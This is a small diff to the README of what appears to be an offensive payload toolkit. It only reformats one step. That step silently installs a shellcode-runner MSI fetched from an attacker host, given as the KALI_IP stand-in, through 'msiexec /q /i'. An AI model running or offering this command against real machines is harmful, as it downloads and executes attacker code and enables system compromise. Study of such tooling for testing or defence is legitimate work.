@@ -288,7 +288,7 @@ The created ```shellcode_runner.msi``` is located under ```payloads/MSI/```. To 
 **Steps**
 - Modify the ```line 16``` on ```Templates/MSI/shellcode_runner.xml```
 - Generate the ```shellcode_runner.msi```
-- Execute it: msiexec /q /i http://KALI_IP/shellcode_runner.msi
+- Execute it: ```msiexec /q /i http://KALI_IP/shellcode_runner.msi```
 
 **Good read**:
 - https://blog.xpnsec.com/becoming-system/ 
